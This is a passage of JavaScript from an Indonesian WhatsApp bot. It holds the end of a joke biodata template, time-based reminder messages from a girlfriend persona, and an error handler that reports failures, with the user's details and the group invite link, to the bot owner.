MAPEL PALING DIBENCI:
KULIAH :
SMA :
SMP:
SD :
TK/PAUD :
AGAMA:
FILM:
SINETRON:
ANIME:
K-DRAMA:
BIAS:
WAIFU:
HUSBU:
HUSBANDO:
LAIFU:
LAGU FAV:
MAKANAN FAV:
MINUMAN FAV:
UKURAN BAJU:
UKURAN CELANA:
UKURAN SEPATU:
UKURAN KAOS KAKI:
PANJANG TANGAN:
PANJANG KAKI:
PANJANG JARI KAKI:
PANJANG JARI TANGAN:
KARTU PELAJAR:
PASSPORT:
NAMA FREEFIRE:
NAMA PUBG:
NAMA HOTEL HIDEAWAY:
NAMA COD:
NAMA COC:
NAMA ML:
NAMA MANTAN:
JUMLAH MANTAN:
TINGGI:
BERAT BADAN:
SUKA SAMA SIAPA:
NAMA PACAR:
CALON ISTRI/SUAMI:
NAMA MERTUA:
BPKB:
KIS:
KIA:
SUHU BADAN:
PANJANG LIDAH:
OVO:
KARTU KREDIT:
KARTU MEMBER:
BCA:
BRI:
TELKOMSEL:
TRI:
KARTU MEMORI:
SMARTFREN:
PENYAKIT:
OBAT:
SIFAT:
ZODIAK:
TANGGAL LAHIR:
KITAB:
TEMPAT IBADAH:
TEMPAT WISATA:
NAMA TEMAN:
JUMLAH MURID DIKELAS:
JUMLAH ANGGOTA KELUARGA:
JUMLAH NYAMUK DIRUMAH:
JUMLAH KECOA DIRUMAH:
JUMLAH KUPU KUPU:
HEWAN KESUKAAN:
NAMA HEWAN PELIHARAAN:
ALAMAT RUMAH:
RT:
RW:
KELURAHAN:
KECAMATAN:
NAMA KOTA:
NAMA NEGARA:
KABUPATEN:
PLANET:
GALAKSI:
LANGIT:
DARATAN:
KEPULAUAN:
SAMUDRA:
LEBAR PINGGANG:
GAME FAVORIT:
CHANNEL YOUTUBE:
SIFAT:
MERK HP:
MERK MOBIL:
MERK LAPTOP:
MERK MOTOR:
JUMLAH MOBIL:
JUMLAH MOTOR:
TINGKAT RUMAH:
ALAMAT SEKOLAH:
NAMA JALAN MENUJU RUMAH:
NAMA JALAN MENUJU SEKOLAH:
ASAL:
NAMA BESTIE:
NAMA BESTFRIEND:
NAMA MUSUH:Lu
GULING ATAU BANTAL:
JUMLAH BAJU:
JUMLAH CELANA:
CITA CITA:
IMPIAN:
`) 
}

if (timeWib >= '04:00' && timeWib <= '04:10') {
console.log(color(`[ AYANG ]`), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'deeppink'))
}
if (timeWib >= '05:00' && timeWib <= '05:10') {
console.log(color(`[ AYANG ]`), color('Udah sholat Subuh belum kak', 'deeppink'))
}
if (timeWib >= '06:00' && timeWib <= '06:10') {
console.log(color(`[ AYANG ]`), color('Pagi kak, Jangan lupa mandi', 'deeppink'))
}
if (timeWib >= '11:00' && timeWib <= '11:10') {
console.log(color(`[ AYANG ]`), color('Siang kak, Dah mandi blm kak?', 'deeppink'))
}
if (timeWib >= '12:00' && timeWib <= '12:10') {
console.log(color(`[ AYANG ]`), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'deeppink'))
}
if (timeWib >= '15:00' && timeWib <= '15:10') {
console.log(color(`[ AYANG ]`), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'deeppink'))
}
if (timeWib >= '18:00' && timeWib <= '18:10') {
console.log(color(`[ AYANG ]`), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'deeppink'))
}
if (timeWib >= '19:00' && timeWib <= '19:10') {
console.log(color(`[ AYANG ]`), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'deeppink'))
}
if (timeWib >= '20:00' && timeWib <= '20:10') {
console.log(color(`[ AYANG ]`), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'deeppink'))
}
if (timeWib >= '00:00' && timeWib <= '00:10') {
console.log(color(`[ AYANG ]`), color('ngantuk kak, tidur dulu ya kak', 'deeppink'))
}


} catch (err){
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n${fake}`)    

if(checkError(err.message, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
addError(err.message, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await Fan.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${fake}\n${calender}`,
buttons: mok,
headerType: 1
}

await Fan.sendMessage(Ownerin, tolol , {quoted: setQuoted})

if(!autoblockcmd){
await Fan.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await Fan.downloadAndSaveMediaMessage(quoted)
await Fan.sendMedia (Ownerin, media, setQuoted, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



} catch (e){
e = String(e) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {return}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
Fan.sendMessage(Ownerin, {text : util.format(e)})
}
console.log(e)
}
}









    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})

